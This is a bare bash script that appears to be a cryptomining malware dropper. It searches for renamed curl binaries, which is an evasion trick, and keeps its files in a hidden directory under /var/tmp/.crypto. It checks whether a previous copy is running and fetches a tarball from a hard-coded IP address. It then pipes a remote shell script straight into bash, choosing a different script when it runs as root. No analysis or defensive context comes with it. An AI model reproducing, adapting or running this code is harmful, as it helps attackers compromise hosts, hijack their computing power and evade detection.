#!/bin/bash
echo "ok22$(date)" >>/tmp/ok.log
export CURL_CMD="curl"
if [ -f /bin/cd1 ];then
    export CURL_CMD="/bin/cd1" 
elif [ -f /bin/cur ];then
    export CURL_CMD="/bin/cur" 
elif [ -f /bin/TNTcurl ];then
    export CURL_CMD="/bin/TNTcurl" 
elif [ -f /bin/curltnt ];then 
    export CURL_CMD="/bin/curltnt" 
elif [ -f /bin/curl1 ];then
    export CURL_CMD="/bin/curl1" 
elif [ -f /bin/cdt ];then
    export CURL_CMD="/bin/cdt" 
elif [ -f /bin/xcurl ];then
    export CURL_CMD="/bin/xcurl"  
elif [ -x "/bin/cdz" ];then
    export CURL_CMD="/bin/cdz"
fi 
sh_url="http://104.192.82.138/s3f1015"  
export MOHOME=/var/tmp/.crypto/...
if [ -f ${MOHOME}/.ddns.log ];then
    echo "process possible running"
    current=$(date +%s)
    last_modified=$(stat -c "%Y" ${MOHOME}/.ddns.log)
    if [ $(($current-$last_modified)) -gt 6 ];then
        echo "process is not running"
    else 
        ${CURL_CMD} -fsSL -o ${MOHOME}/.ddns.pid ${sh_url}/m/reg0.tar.gz
        exit 0
    fi
fi
if [ "$(id -u)" == "0" ];then
    ${CURL_CMD} -fsSL ${sh_url}/c/ar.sh |bash
else
    ${CURL_CMD} -fsSL ${sh_url}/c/ai.sh |bash
fi
